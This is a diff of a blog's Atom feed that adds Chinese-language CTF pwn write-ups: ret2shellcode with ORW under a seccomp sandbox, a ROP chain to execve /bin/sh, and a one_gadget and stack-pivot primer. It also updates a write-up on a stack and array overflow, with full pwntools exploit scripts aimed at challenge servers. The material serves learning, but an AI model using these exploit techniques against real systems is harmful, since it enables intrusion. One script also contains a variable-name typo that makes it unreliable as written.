@@ -6,7 +6,7 @@
   <link href="https://jiutian521.github.io/atom.xml" rel="self"/>
   
   <link href="https://jiutian521.github.io/"/>
-  <updated>2025-11-27T13:38:47.886Z</updated>
+  <updated>2025-11-30T10:05:31.080Z</updated>
   <id>https://jiutian521.github.io/</id>
   
   <author>
@@ -15,6 +15,85 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ret2shellcode与沙箱</title>
+    <link href="https://jiutian521.github.io/posts/d9295e2f.html"/>
+    <id>https://jiutian521.github.io/posts/d9295e2f.html</id>
+    <published>2025-11-30T04:00:00.000Z</published>
+    <updated>2025-11-30T10:05:31.080Z</updated>
+    
+    <content type="html"><![CDATA[<p>这一块的题难度上升的有点快，已经涉及到基本的汇编知识了，并且明显看出来在为接下来的ret2syscall做铺垫，exp也是不好理解，接下来进行详细的讲解</p><h1 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h1><p>seccomp函数，它会阻止进程的一部分系统调用，比如我们的execve，这种情况下我们无法直接拿到shell，只能去通过orw，即open-read-write去读出flag文件</p><blockquote><p>seccomp-tools dump .&#x2F;pwn</p></blockquote><p>我们可以通过上述指令查看允许的系统调用</p><h1 id="pwntools的前置语法基础"><a href="#pwntools的前置语法基础" class="headerlink" title="pwntools的前置语法基础"></a>pwntools的前置语法基础</h1><p>我们需要一些pwntools的语法，不过这并不算难</p><blockquote><p>asm(code, vma&#x3D;0, extract&#x3D;True, arch&#x3D;None, os&#x3D;None)</p></blockquote><p>后面三个不用管，我们重点看前两个</p><p>code是必填的，它包含汇编指令的字符串<br>vms是虚拟内存地址，是指定代码被编译时所处的起始地址</p><blockquote><p>asm(shellcraft.你要调用的函数)</p></blockquote><p>shellcraft不仅可以帮助我们生成shellcode的汇编，还可以帮我们生成某个函数的汇编代码，这样就不需要我们自己生成了</p><p>如果我们需要写连续的汇编指令，可以用分分号连接</p><h1 id="eg：ctfshow-pwn69"><a href="#eg：ctfshow-pwn69" class="headerlink" title="eg：ctfshow pwn69"></a>eg：ctfshow pwn69</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);</span><br><span class="line">  sub_400949();</span><br><span class="line">  sub_400906();</span><br><span class="line">  sub_400A16();</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_400949()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(0LL);</span><br><span class="line">  seccomp_rule_add(v1, 2147418112LL, 0LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v1, 2147418112LL, 1LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v1, 2147418112LL, 2LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v1, 2147418112LL, 60LL, 0LL);</span><br><span class="line">  return seccomp_load(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void sub_400906()</span><br><span class="line">&#123;</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int sub_400A16()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[32]; // [rsp+0h] [rbp-20h] BYREF</span><br><span class="line"></span><br><span class="line">  puts(&quot;Now you can use ORW to do&quot;);</span><br><span class="line">  read(0, buf, 0x38uLL);</span><br><span class="line">  return puts(&quot;No you don&#x27;t understand I say!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个函数里存在沙箱，第三个函数里给了我们栈溢出的地方</p><p>一般来说遇到read函数我们就要注意了，因为它通常会限制我们溢出的长度，本题就是只给了我们0x38的余地，这显然是不够的，但是我们注意到main函数里存在mmap函数，可以放到0x123000处</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-24_16-58-55.4xuz6rej1q.png"></p><p>沙箱只允许我们进行orw这三个函数的系统调用</p><p>我一开始的思路和ret2syscall一样，打算先找寄存器的gadget，但是用ROPgadget尝试找了gadget发现是找不到的，所以这个题主要利用的不全是ROP技术，我们是直接在mmap分配的内存里直接写入汇编指令的，不需要费劲一个个跳转了</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-24_21-17-26.wizsmiucs.png"></p><p>我们不要用pop rsp，要用jmp rsp</p><blockquote><p>0x0000000000400a01 : jmp rsp</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">p=remote(&quot;pwn.challenge.ctf.show&quot;,28296)</span><br><span class="line">mmap_addr=0x123000</span><br><span class="line">jmp_rsp=0x400a01</span><br><span class="line"></span><br><span class="line">#recvuntil不仅仅可以用来接收数据，还可以告诉exp什么时候该发送</span><br><span class="line">p.recvuntil(&quot;Now you can use ORW to do\n&quot;)</span><br><span class="line"></span><br><span class="line">#ORW的板子</span><br><span class="line">shellcode=asm(shellcraft.open(&quot;./ctfshow_flag&quot;))</span><br><span class="line">shellcode+=asm(shellcraft.read(3,mmap_ar,0x100))</span><br><span class="line">shellcode+=asm(shellcraft.write(1,mmap_ar,0x100))</span><br><span class="line"></span><br><span class="line">payload = flat([(asm(shellcraft.read(0,mmap_ar,0x100))+asm(&quot;mov rax,0x123000; jmp rax&quot;)).ljust(0x28,b&#x27;a&#x27;),jmp_rsp,asm(&quot;sub rsp,0x30; jmp rsp&quot;)])</span><br><span class="line"></span><br><span class="line">#先发shellcode，再发paylaod</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>在栈迁移里，我们学到在返回地址处，程序调用ret指令，等价于pop rip，会把返回地址弹到rip寄存器里</p><p>我们把read(0,mmap_addr,0x100)，mov rax,0x123000，jmp rax写到缓冲区开始，然后把返回地址改成jmp_rsp，也就是把jmp_rsp的地址弹到rip里，然后rsp随后指向sub rsp,0x30; jmp rsp，也就是把rsp往下减0x30个字节到缓冲区开始，然后再jmp rsp跳转过去。接下来我们执行read(0,mmap_addr,0x100)这个时候程序挂起等待我们输入，并且把输入的内容存到mmap里，然后mov rax,0x123000，jmp rax，跳转到mmap处，开始执行shellcode</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这种ret2ORW的题目本质上还是ret2shellcode，只不过需要我们自己套模板，这里的jmp rsp是精妙之处，要重点理解</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;这一块的题难度上升的有点快，已经涉及到基本的汇编知识了，并且明显看出来在为接下来的ret2syscall做铺垫，exp也是不好理解，接下来进行详细的讲解&lt;/p&gt;
+&lt;h1 id=&quot;沙箱&quot;&gt;&lt;a href=&quot;#沙箱&quot; class=&quot;headerlink&quot; title=&quot;沙箱&quot;&gt;</summary>
+      
+    
+    
+    
+    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
+    
+    
+    <category term="ret2shellcode" scheme="https://jiutian521.github.io/tags/ret2shellcode/"/>
+    
+    <category term="沙箱" scheme="https://jiutian521.github.io/tags/%E6%B2%99%E7%AE%B1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>初识ropchain和one_gadget</title>
+    <link href="https://jiutian521.github.io/posts/3bdcf6a2.html"/>
+    <id>https://jiutian521.github.io/posts/3bdcf6a2.html</id>
+    <published>2025-11-27T16:00:00.000Z</published>
+    <updated>2025-11-28T11:39:03.112Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Ropchain"><a href="#Ropchain" class="headerlink" title="Ropchain"></a>Ropchain</h1><p>一把梭工具，非常好用，比较简单就不介绍了</p><p>eg：CTFshow pwn73</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">io=process(&quot;./pwn73&quot;)</span><br><span class="line"># Padding goes here</span><br><span class="line">p = cyclic(0x18+4)</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080b81c6) # pop eax ; ret</span><br><span class="line">p += &#x27;/bin&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080b81c6) # pop eax ; ret</span><br><span class="line">p += &#x27;//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08049303) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080de955) # pop ecx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08049303) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806cc25) # int 0x80</span><br><span class="line">io.recvuntil(&quot;hand!!\n&quot;)</span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h1><h2 id="eg：ctfshow-pwn74"><a href="#eg：ctfshow-pwn74" class="headerlink" title="eg：ctfshow pwn74"></a>eg：ctfshow pwn74</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4[3]; // [rsp+8h] [rbp-18h] BYREF</span><br><span class="line"></span><br><span class="line">  v4[2] = __readfsqword(0x28u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  puts(s);</span><br><span class="line">  puts(asc_A80);</span><br><span class="line">  puts(asc_B00);</span><br><span class="line">  puts(asc_B90);</span><br><span class="line">  puts(asc_C20);</span><br><span class="line">  puts(asc_CA8);</span><br><span class="line">  puts(asc_D40);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(aClassifyCtfsho);</span><br><span class="line">  puts(&quot;    * Type  : PWN_Tricks                                              &quot;);</span><br><span class="line">  puts(&quot;    * Site  : https://ctf.show/                                       &quot;);</span><br><span class="line">  puts(&quot;    * Hint  : Use one_gadget a shuttle!                               &quot;);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  printf(&quot;What&#x27;s this:%p ?\n&quot;, &amp;printf);</span><br><span class="line">  __isoc99_scanf(&quot;%ld&quot;, v4);</span><br><span class="line">  v4[1] = v4[0];</span><br><span class="line">  ((void (*)(void))v4[0])();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题是NX，PIE，canary保护全开的，打印了printf的地址</p><p>这个题我们不想需要栈溢出，因此canary保护可有可无，而PIE就要求我们libc了</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;Ropchain&quot;&gt;&lt;a href=&quot;#Ropchain&quot; class=&quot;headerlink&quot; title=&quot;Ropchain&quot;&gt;&lt;/a&gt;Ropchain&lt;/h1&gt;&lt;p&gt;一把梭工具，非常好用，比较简单就不介绍了&lt;/p&gt;
+&lt;p&gt;eg：CTFshow pwn73&lt;/</summary>
+      
+    
+    
+    
+    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
+    
+    
+    <category term="tools" scheme="https://jiutian521.github.io/tags/tools/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>初识栈迁移</title>
+    <link href="https://jiutian521.github.io/posts/b824b28e.html"/>
+    <id>https://jiutian521.github.io/posts/b824b28e.html</id>
+    <published>2025-11-27T16:00:00.000Z</published>
+    <updated>2025-11-29T11:52:10.681Z</updated>
+    
+    <content type="html"><![CDATA[<p>目的：将栈迁移到bss heap libc等上</p><p>leave<br>move esp ebp<br>pop ebp 把栈顶的值弹给EBP寄存器</p><p>ret<br>pop rip 从当前位置弹出值兵赋给rip<br>jmp rip</p><p>函数的退出</p><p>move esp ebp 销毁栈<br>pop ebp 给ebp赋值</p><p>把父函数ebp改成bss段的地址</p><p>销毁步骤正常<br>ebp被修改</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-29_19-41-18.102lxe3v5a.png"></p><p>-00000028 s               db ? 数组s<br>-00000004 var_4           dd ? ida没识别出来的局部变量，表示距离ebp的距离为4<br><strong>+00000000 旧的ebp</strong><br>+00000004  r       db 4 dup(?)  返回地址<br>再往下 参数  </p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;目的：将栈迁移到bss heap libc等上&lt;/p&gt;
+&lt;p&gt;leave&lt;br&gt;move esp ebp&lt;br&gt;pop ebp 把栈顶的值弹给EBP寄存器&lt;/p&gt;
+&lt;p&gt;ret&lt;br&gt;pop rip 从当前位置弹出值兵赋给rip&lt;br&gt;jmp rip&lt;/p&gt;
+&lt;p&gt;函数的退</summary>
+      
+    
+    
+    
+    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
+    
+    
+    <category term="栈迁移" scheme="https://jiutian521.github.io/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
+    
+  </entry>
   
   <entry>
     <title>用gdb调试ret2syscall</title>
@@ -69,7 +148,7 @@
     <link href="https://jiutian521.github.io/posts/fe35eb25.html"/>
     <id>https://jiutian521.github.io/posts/fe35eb25.html</id>
     <published>2025-11-24T16:00:00.000Z</published>
-    <updated>2025-11-25T16:34:40.398Z</updated>
+    <updated>2025-11-28T09:53:33.703Z</updated>
     
     <content type="html"><![CDATA[<p>开始做ISCTF的真题</p><h1 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h1><blockquote><p>题目难度：简单<br>题目描述：你能记住你女朋友的生日嘛？</p></blockquote><p>首先先点评一下，出题人出这个题缝合了两个关卡，把栈溢出，ret2text和数组越界全都考察了一遍，我认为出的水平非常高，符合新生赛要求</p><p>当然这么简单的一个题我居然想了一天，也确实是见识少了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[40]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  char s1[8]; // [rsp+28h] [rbp-8h] BYREF</span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  puts(&quot;welcome to isctf2024&quot;);</span><br><span class="line">  puts(&quot;first i need your team id&quot;);</span><br><span class="line">  read(0, buf, 0x30uLL);</span><br><span class="line">  if ( strcmp(s1, &quot;admin&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;no no no&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;ok, go on&quot;);</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 vuln()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  _QWORD v1[5]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  __int64 i; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0LL; i &lt;= 7; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;please input your %d girlfriend birthday\n&quot;, i + 1);</span><br><span class="line">    result = __isoc99_scanf(&quot;%ld&quot;, &amp;v1[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>canary保护关<br>NX保护开<br>PIE关  </p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-25_23-05-44.51el69r656.webp"></p><p>存在system和bin&#x2F;sh字符串，而且可以直接getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall amaze()</span><br><span class="line">&#123;</span><br><span class="line">  system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合本题是除签到以外的第一道pwn题，因此把方向定到了ret2text和栈溢出</p><h1 id="利用栈溢出实现任意写"><a href="#利用栈溢出实现任意写" class="headerlink" title="利用栈溢出实现任意写"></a>利用栈溢出实现任意写</h1><p>下面来具体分析程序</p><p>第一关考察了利用栈溢出实现任意写，以下是第一段payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = 0x28 * b&#x27;\x00&#x27;</span><br><span class="line">payload += b&#x27;admin\x00\x00\x00&#x27;</span><br><span class="line">p.sendafter(b&#x27;team id&#x27;, payload)</span><br></pre></td></tr></table></figure><p>我们必须要通过strcmp函数关于s1和admin字符串的比较才能进入vuln函数，但是我们无法通过直接写的方式把admin字符串写到s1里，那我们就要利用栈溢出，先通过read覆盖buf，40个，即0x28个字节，然后会溢出到s1，通过栈溢出实现任意写</p><p>需要注意的是admin后面跟了三个\x00，因为strcmp(a, b)是逐字节比较a和b，直到遇到第一个\x00才停止，\x00也是字符串结束的标志。admin为5个字节，因此我们最好补充三个\x00凑够8个字节，当然一个\x00有时候也可以</p><h1 id="数组越界"><a href="#数组越界" class="headerlink" title="数组越界"></a>数组越界</h1><p>进vuln函数开始第二关，我们需要关注的是定义了一个大小为5字节的数组v1，以及定义了局部变量i</p><p>然后有一个循环，scanf让我们可以读进long类型的整数,这里需要注意，我们通过这种方式输入的必须是十进制整数，因此我们需要把后门函数的十六进制地址手动转化成十进制的。并且这里用p64打包也是不可以的</p><p>v1[i]需要引起我们的注意，这里就涉及到了数组越界的知识</p><p>关于数组越界，可以参考下面的文章</p><blockquote><p><a href="https://hello-ctf.com/hc-pwn/Stack_Overflow/">https://hello-ctf.com/hc-pwn/Stack_Overflow/</a></p></blockquote><p>总之，程序给v1的内存大小只有五个字节，当我们将其改为v1[6]时，我们就可以往栈上写东西了</p><p>我们的思路是，先一次输入5个数，比如1，1，1，1，1，第六次时输入6，为什么要输入6，是因为此时的栈大概是这样的</p><p>[高地址]<br>RIP<br>RBP<br>i<br>v[4]<br>v[3]<br>v[2]<br>v[1]<br>v[0]<br>[低地址]  </p><p>我们输入6后，将会把i覆盖成6，这个时候就能出现a[6]，同时循环也不会结束，（如果我们写入1，循环不会继续进行），由于i小于7，i会继续加1，这就有第七次写入的机会</p><p>我们必须要知道，这个循环不会因为我们的输入而停止，只要i小于等于7，循环一定是会进行的，并且一定会进行8次</p><p>我们可以通过gdb调试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;split-window&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p = process([elf.path])</span><br><span class="line">#p = remote(&#x27;challenge.imxbt.cn&#x27; , 32106)</span><br><span class="line"></span><br><span class="line">gdb.attach(p, &#x27;b vuln&#x27;)</span><br><span class="line"></span><br><span class="line">payload = 0x28 * b&#x27;A&#x27;</span><br><span class="line">payload += b&#x27;admin\x00\x00\x00&#x27;</span><br><span class="line">#gdb.attach(p , &#x27;b vuln&#x27;)</span><br><span class="line">p.sendafter(b&#x27;team id&#x27;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-25_21-41-12.1hsngi3csz.webp"></p><p>通过gdb调试，我注意到一个很有意思的事，我明明没有覆盖到rbp，但是rbp指针指向的地址里却有个1</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-26_00-10-19.102lrxyovk.webp"></p><p>这是没有开始覆盖前的栈，可以看到确rbp天然存了一个1，这就让我们不需要再覆盖rbp了，因此直接加上后门函数的地址即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p=process(&quot;./girlfriend&quot;)</span><br><span class="line">p=remote(&quot;challenge.imxbt.cn&quot;,32331)</span><br><span class="line">payload=b&#x27;a&#x27;*0x28+b&#x27;admin\x00\x00\x00&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;6&#x27;)</span><br><span class="line">#理论上是需要再sendline一个padding覆盖rbp的</span><br><span class="line">p.sendline(str(0x40121E))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/4514374EFE2509819639A5A5FEA42C78.1sfh9okrzs.png"></p>]]></content>
     
@@ -90,30 +169,7 @@
     
     <category term="数组越界" scheme="https://jiutian521.github.io/tags/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/"/>
     
-  </entry>
-  
-  <entry>
-    <title>ret2shellcode与沙箱</title>
-    <link href="https://jiutian521.github.io/posts/d9295e2f.html"/>
-    <id>https://jiutian521.github.io/posts/d9295e2f.html</id>
-    <published>2025-11-24T04:00:00.000Z</published>
-    <updated>2025-11-24T13:28:53.143Z</updated>
-    
